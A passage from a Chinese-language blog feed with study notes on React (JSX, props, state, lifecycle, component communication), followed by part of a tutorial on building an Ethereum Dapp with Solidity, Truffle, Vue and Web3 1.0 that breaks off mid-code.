punctuation">;</span></code></pre></li><li>组件化可以帮助我们解决前端结构的复用问题，提供一种高效的方式自动化地帮助我们更新页面，降低我们的复杂度，带来更好的可维护性</li><li>组件渲染过程：jsx经过Babel编译和React构造器生成一个JS对象结构，再通过<code>ReactDOM.render()</code>生成DOM元素，插入页面中</li></ul><h4 id="jsx基本语法"><a href="#jsx基本语法" class="headerlink" title="jsx基本语法"></a>jsx基本语法</h4><ul><li>本质上来讲，JSX 只是为 <code>React.createElement(component, props, ...children)</code>方法提供的语法糖</li><li>一个顶级标签和<code>()</code>括号包裹</li><li>组件首字母大写</li><li>js表达式写在<code>{expression}</code>花括号中</li><li>行内样式写在 <code>style={object}</code> 中，遇到<code>-</code>分隔符使用驼峰写法</li><li>html属性标签的区别：<code>class</code>-<code>className</code>、<code>for</code>-<code>htmlFor</code>、<code>index</code>-<code>tabIndex</code></li><li>带标签字符串转义为html解析<pre class=" language-javascript"><code class="language-javascript">dangerouslySetInnerHTML<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> __html<span class="token punctuation">:</span> htmlString<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li>使用三目运算符写法代替<code>if-else</code></li><li>注释使用花括号<code>{/*注释...*/}</code></li><li>属性默认为<code>true</code></li><li>展开属性：使用 <code>...</code> 作为“展开(spread)”操作符来传递整个属性对象<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> Button <span class="token operator">=</span> props <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">{</span> kind<span class="token punctuation">,</span> <span class="token operator">...</span>other <span class="token punctuation">}</span> <span class="token operator">=</span> props<span class="token punctuation">;</span>  <span class="token keyword">const</span> className <span class="token operator">=</span> kind <span class="token operator">===</span> <span class="token string">"primary"</span> <span class="token operator">?</span> <span class="token string">"PrimaryButton"</span> <span class="token punctuation">:</span> <span class="token string">"SecondaryButton"</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">&lt;</span>button className<span class="token operator">=</span><span class="token punctuation">{</span>className<span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token operator">...</span>other<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></li><li>布尔值、Null 和 Undefined 被忽略</li></ul><h4 id="React中的事件监听"><a href="#React中的事件监听" class="headerlink" title="React中的事件监听"></a>React中的事件监听</h4><ul><li>使用<code>on*</code>进行事件监听，React事件绑定属性的命名采用驼峰式写法</li><li>在jsx中调用是传入事件处理函数给表达式<code>{}</code></li><li>事件监听函数自动传入一个React重新包装的<code>event</code>对象，不需要考虑兼容问题；一般来说，我们在实例中定义一个方法，this指向实例本身。但是在事件监听函数中，如果我们使用实例，需要手动绑定<code>this.handleEvent.bind(this)</code></li></ul><h4 id="props"><a href="#props" class="headerlink" title="props"></a>props</h4><ul><li>每个组件可以接受一个props对象的属性，包含对于组件的配置</li><li>组件内部是通过<code>this.props</code>的方式获取到组件的参数</li><li><code>this.props</code>对象的属性与组件的属性一一对应，<code>this.props.children</code>属性表示组件的所有子节点</li><li><strong>只读性</strong>：无论是使用函数或是类来声明一个组件，它决不能修改它自己的props</li><li>在使用一个组件的时候，可以把参数放在标签的属性当中，所有的属性都会作为 props 对象的键值</li><li>默认配置 defaultProps，不需要判断配置属性是否传入<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">static</span> defaultProps <span class="token operator">=</span> <span class="token punctuation">{</span>  key<span class="token punctuation">:</span> defaultValue<span class="token punctuation">}</span></code></pre></li></ul><h4 id="state"><a href="#state" class="headerlink" title="state"></a>state</h4><ul><li>state可以用来保存组件有私有的可变的状态，用以更新组件UI。<strong>状态是私有的，完全受控于当前组件</strong></li><li><code>setState({type: Object})</code>用来更新组件状态<ul><li>调用这个方法，会更新state，并且重新调用<code>render()</code>方法，渲染的最新的内容显示到页面上</li><li>方法不会立即执行，而是缓存到事件队列中合并执行</li><li>如果需要使用上次调用后的结果，可以传入一个函数，通过<code>prevState</code>参数调用上个setState的返回结果</li></ul></li><li>state和props:<ul><li>state 是让组件控制自己的状态，props 是让外部对组件自己进行配置</li><li>没有state的组件叫无状态组件，设置了state的叫做有状态组件。因为状态会带来管理的复杂性，我们尽量多地写无状态组件，尽量少地写有状态的组件。这样会降低代码维护的难度，增强组件的可复用性</li></ul></li></ul><h4 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h4><ul><li>直接传入数组<code>{[Array]}</code></li><li>使用 map 渲染列表数据</li><li>Keys可以在DOM中的某些元素被增加或删除的时候帮助React识别哪些元素发生了变化。因此你应当给数组中的每一个元素赋予一个确定的标识<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> numbers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> listItems <span class="token operator">=</span> numbers<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span><span class="token operator">&lt;</span>li key<span class="token operator">=</span><span class="token punctuation">{</span>number<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>  <span class="token punctuation">{</span>number<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h4 id="表单——受控组件"><a href="#表单——受控组件" class="headerlink" title="表单——受控组件"></a>表单——受控组件</h4><ul><li>input: 通过事件监听更新状态<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">NameForm</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span><span class="token function">constructor</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>handleChange <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>handleChange<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>handleSubmit <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>handleSubmit<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">handleChange</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">handleSubmit</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'A name was submitted: '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token operator">&lt;</span>form onSubmit<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleSubmit<span class="token punctuation">}</span><span class="token operator">></span>      <span class="token operator">&lt;</span>label<span class="token operator">></span>        Name<span class="token punctuation">:</span>        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> value<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>value<span class="token punctuation">}</span> onChange<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleChange<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">></span>      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"Submit"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><h4 id="状态提升"><a href="#状态提升" class="headerlink" title="状态提升"></a>状态提升</h4><ul><li><strong>状态提升</strong>：使用 react 经常会遇到几个组件需要共用状态数据的情况。这种情况下，我们最好将这部分共享的状态提升至他们最近的父组件当中进行管理<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Input</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span><span class="token function">handleChange</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">setNum</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>      <span class="token operator">&lt;</span>input        type<span class="token operator">=</span><span class="token string">"number"</span>        value<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>value<span class="token punctuation">}</span>        onChange<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleChange<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span>      <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">PercentageShower</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span><span class="token function">numberToPercentage</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> val <span class="token operator">=</span> value <span class="token operator">*</span> <span class="token number">100</span>  <span class="token keyword">return</span> val<span class="token punctuation">.</span><span class="token function">toFixed</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%'</span><span class="token punctuation">}</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">></span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">numberToPercentage</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">PercentageApp</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span><span class="token function">constructor</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>    value<span class="token punctuation">:</span> <span class="token number">0</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">setNum</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    value<span class="token punctuation">:</span> val  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>      <span class="token operator">&lt;</span>Input value<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>value<span class="token punctuation">}</span> setNum<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>setNum<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span>      <span class="token operator">&lt;</span>PercentageShower value<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>value<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h4><ul><li><code>componentWillMount()</code>：在组件挂载前被立即调用，即在初始化render之前，因此在此函数中改变State不会触发重新渲染，也不可以在此函数中进行DOM操作，在此函数中可以访问组件的Props，如果需要从远端加载数据，也可以在此函数中进行操作</li><li><code>componentDidMount()</code>：此函数在组件挂载之后立即被调用，在此方法中改变State会触发重新渲染，在此函数中对DOM进行操作是安全的</li><li><code>componentWillReceiveProps(nextProps)</code>：此函数在已挂载的组件接收到新的Props时被调用，当需要响应Props的变更并对State进行修改时，可以在此方法中进行。<code>this.props</code>访问旧的Props,参数nextProps可以访问新的Props</li><li><code>shouldComponentUpdate(nextProps, nextState)</code>：此函数在组件接收到新的State或Props之后，重新渲染之前调用，默认返回<code>true</code>。默认情况下，每次组件的State或Props变化之后，都会重新渲染。如果确定某些State或Props的变化不需要重新渲染，为了提高性能，可以在此函数中进行盘端，并返回false</li><li><code>componentWillUpdate()</code>：此函数在组件重新渲染之前立即被调用，在组件第一次渲染前不会被调用，在shouldComponentUpdate返回false的情况下也不会被调用，不要再此函数中进行setState操作</li><li><code>componentDidUpdate()</code>：此函数在组件重新渲染之后被立即调用，在组件第一次渲染前不会被调用，在shouldComponentUpdate返回false的情况下也不会被调用。此函数是DOM更新后进行操作的一个好时机</li><li><code>componentWillUnmount()</code>：此函数在组件被卸载和销毁前立即被调用，此函数可以做一些清除重置的操作，比如清空定时器、取消网络请求和移除事件的监听</li></ul><h4 id="组件间通信"><a href="#组件间通信" class="headerlink" title="组件间通信"></a>组件间通信</h4><ul><li>父子组件通信<ul><li>父组件向子组件传递数据：子组件通过<code>this.props</code>引用父组件传递的数据</li><li>子组件向父组件传递数据：父组件将回调函数通过<code>Props</code>设置给子组件</li></ul></li><li>相互独立的组件通信<ul><li>共同的父级组件通信：子组件1先与父组件通信，再将数据传递到子组件</li><li>通过事件系统通信：一个全局事件订阅和发布者。在订阅事件的同时最好为事件名指定一个命名空间，避免事件名的重复而导致混乱。订阅事件要在组件<code>componentDidMount</code>函数中进行，取消订阅在<code>componentWillUnmount</code>函数中进行</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> react </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Truffle+Vue+Web3 1.0创建一个以太坊Dapp</title>
      <link href="/2018/12/10/truffle-vue-web3-1.0-chuang-jian-yi-ge-yi-tai-fang-dapp/"/>
      <url>/2018/12/10/truffle-vue-web3-1.0-chuang-jian-yi-ge-yi-tai-fang-dapp/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://juejin.im/post/5aba0870f265da23a2292245" target="_blank" rel="noopener">使用 Web3 和 Vue.js 来创建你的第一个以太坊 dAPP</a></li><li><a href="https://web3js.readthedocs.io/en/1.0/" target="_blank" rel="noopener">web3 1.0 API</a></li></ul><h4 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h4><ul><li>Windows10</li><li>web3 1.0</li></ul><h4 id="编写第一个Solidity智能合约"><a href="#编写第一个Solidity智能合约" class="headerlink" title="编写第一个Solidity智能合约"></a>编写第一个Solidity智能合约</h4><p>一个简单的例子是编写一个可以注册，保存社区成员信息和简单电子钱包功能的账户合约</p><pre class=" language-solidity"><code class="language-solidity">pragma solidity ^0.4.24;import "./SafeMath.sol";//开源的安全操作unit256的合约contract Account{    using SafeMath for uint256;    //新成员创建事件    event NewMember(string _name, string _avator);    //成员信息结构    struct Member {        string name;//名字        string avatar;//头像        bool isExist;//是否注册        uint256 balance;//可周转余额    }    //地址到成员信息的mapping    mapping(address => Member) internal addressToMember;    //限制调用的条件    modifier onlyMemberOf(address _from){        require(addressToMember[_from].isExist);        _;    }    // 注册    function registerMember(string _name, string _avatar) public {        require(!isMemberOf());        addressToMember[msg.sender] = Member(_name, _avatar, true, 0);        emit NewMember(_name, _avatar);    }    // 判断是否注册    function isMemberOf() public view returns (bool) {        return addressToMember[msg.sender].isExist;    }    // 获取个人信息    function getMemberInfo() public view onlyMemberOf(msg.sender)      returns (string name, string avatar, uint256 balance) {        return (addressToMember[msg.sender].name,                addressToMember[msg.sender].avatar,                addressToMember[msg.sender].balance);    }    //获取当前合约中的总余额    function getTotalBalance() public view returns (uint256) {        return address(this).balance;    }    //取出可周转余额    function withdraw(uint256 amount) public onlyMemberOf(msg.sender)      returns (uint256) {        require(address(this).balance >= amount);        addressToMember[msg.sender].balance = addressToMember[msg.sender].balance.sub(amount);        msg.sender.transfer(amount);        return addressToMember[msg.sender].balance;    }}</code></pre><h4 id="在Remix上部署合约"><a href="#在Remix上部署合约" class="headerlink" title="在Remix上部署合约"></a>在Remix上部署合约</h4><ul><li>安装Ganache</li><li>使用Ganache本地测试：安装MetaMask Chrome插件, 选择Custom RPC创建RPC连接到<a href="http://127.0.0.1:7545" target="_blank" rel="noopener">http://127.0.0.1:7545</a><br><img src="https://user-gold-cdn.xitu.io/2018/12/12/167a15fd31d3d11f?w=356&amp;h=485&amp;f=jpeg&amp;s=30380" alt=""></li><li>或者要部署到私有节点，可以使用命令行，然后选择Custom RPC创建RPC连接到<a href="http://127.0.0.1:8545" target="_blank" rel="noopener">http://127.0.0.1:8545</a><pre><code>$ geth --identity &quot;MY Etherum&quot; --rpc --rpccorsdomain &quot;*&quot; --datadir data --port &quot;8545&quot; --rpcapi &quot;db,eth,net,web3,personal&quot; --networkid 666 console</code></pre></li><li>打开<a href="https://remix.ethereum.org" target="_blank" rel="noopener">Remix在线编译</a>，在compile选择合适的编译版本编译，在run选择Deploy部署得到合约地址</li><li>可以在Remix上测试我们的合约（注册后getMemberInfo可以用户信息，isMemberOf为true）<br><img src="https://user-gold-cdn.xitu.io/2018/12/12/167a17567f288070?w=381&amp;h=183&amp;f=jpeg&amp;s=18053" alt=""><br><img src="https://user-gold-cdn.xitu.io/2018/12/12/167a175aaf20932c?w=371&amp;h=294&amp;f=jpeg&amp;s=24279" alt=""></li><li>合约部署和测试成功后，将ABI和Deployed Contracts复制保存到本地文件夹(注意Ganache得到的地址是临时的，下次打开就会失效)<br><img src="https://user-gold-cdn.xitu.io/2018/12/12/167a16d4c25b8231?w=834&amp;h=472&amp;f=jpeg&amp;s=67775" alt=""></li></ul><h4 id="配置Truffle-Vue项目"><a href="#配置Truffle-Vue项目" class="headerlink" title="配置Truffle+Vue项目"></a>配置Truffle+Vue项目</h4><ul><li>环境配置<br>在windows下需要先安装node.js, 建议使用Git Bash或者PowerShell执行命令：<pre class=" language-bash"><code class="language-bash">  $ <span class="token function">npm</span> <span class="token function">install</span> -g -production windows-build-tools  $ <span class="token function">npm</span> <span class="token function">install</span> -g ganache-cli  $ <span class="token function">npm</span> <span class="token function">install</span> -g truffle  $ <span class="token function">npm</span> <span class="token function">install</span> -g vue-cli</code></pre></li><li>Vue项目安装<pre class=" language-bash"><code class="language-bash">  $ vue init webpack ecourse // vue init webpach + 你的项目名  $ <span class="token function">cd</span> ecourse  $ <span class="token function">npm</span> <span class="token function">install</span> --save element-ui vue-router vuex web3@1.0.0-beta.36 web3-net@1.0.0-beta.36</code></pre></li><li>添加文件及文件夹：① contracts放置.sol合约； ② store放置Vuex状态控制代码；③ util放置工具函数，util/constant放置上一步中编译好的合约地址和ABI,util/config放置一些配置<br><img src="https://user-gold-cdn.xitu.io/2018/12/12/167a182bfe79f0cc?w=255&amp;h=383&amp;f=jpeg&amp;s=19638" alt=""></li></ul><h4 id="完善项目"><a href="#完善项目" class="headerlink" title="完善项目"></a>完善项目</h4><p>具体的配置可以参考博客<a href="https://juejin.im/post/5aba0870f265da23a2292245" target="_blank" rel="noopener">使用 Web3 和 Vue.js 来创建你的第一个以太坊 dAPP</a>，这里我主要指出使用web3 1.0 标准的不同配置</p><ul><li><p>getWeb3.js  </p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">import</span> Web3 <span class="token keyword">from</span> <span class="token string">'web3'</span><span class="token keyword">let</span> getWeb3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> web3js <span class="token operator">=</span> window<span class="token punctuation">.</span>web3<span class="token punctuation">;</span><span class="token keyword">var</span> web3Provider<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> web3js <span class="token operator">!==</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    web3Provider <span class="token operator">=</span> web3js<span class="token punctuation">.</span>currentProvider<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    web3Provider <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Web3<span class="token punctuation">.</span>providers<span class="token punctuation">.</span>HttpProvider</span><span class="token punctuation">(</span><span class="token string">'http://127.0.0.1:7545'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> web3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Web3</span><span class="token punctuation">(</span>web3Provider<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    injectedWeb3<span class="token punctuation">:</span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token function">isListening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 新的api</span>    <span class="token function">web3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> web3    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>result <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token punctuation">{</span>      result<span class="token punctuation">.</span><span class="token function">web3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>eth<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> networkId<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 新的api</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Unable to retrieve network ID'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'retrieve newworkId: '</span> <span class="token operator">+</span> networkId<span class="token punctuation">)</span>            result <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> result<span class="token punctuation">,</span> <span class="token punctuation">{</span>networkId<span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token function">resolve</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>result <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token punctuation">{</span>      result<span class="token punctuation">.</span><span class="token function">web3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">getCoinbase</span><span class="token punctuation">(</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> coinbase<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Unable to retrieve coinbase'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      coinbase <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">web3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>utils<span class="token punctuation">.</span><span class="token function">toChecksumAddress</span><span class="token punctuation">(</span>coinbase<span class="token punctuation">)</span><span class="token punctuation">;</span>          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'retrieve coinbase: '</span><span class="token operator">+</span> coinbase<span class="token punctuation">)</span><span class="token punctuation">;</span>          result <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> result<span class="token punctuation">,</span> <span class="token punctuation">{</span>coinbase<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">resolve</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>      <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> getWeb3</code></pre></li><li>pollWeb3.js(web3 1.0 添加了新的api能够监听账户地址的变化，不需要使用setIntervel进行轮询)<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">import</span> Web3 <span class="token keyword">from</span> <span class="token string">'web3'</span><span class="token keyword">import</span> <span class="token punctuation">{</span>store<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../store/'</span><span class="token keyword">let</span> web3 <span class="token operator">=</span> window<span class="token punctuation">.</span>web3<span class="token punctuation">;</span>web3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Web3</span><span class="token punctuation">(</span>web3<span class="token punctuation">.</span>currentProvider<span class="token punctuation">)</span><span class="token punctuation">;</span>web3<span class="token punctuation">.</span>currentProvider<span class="token 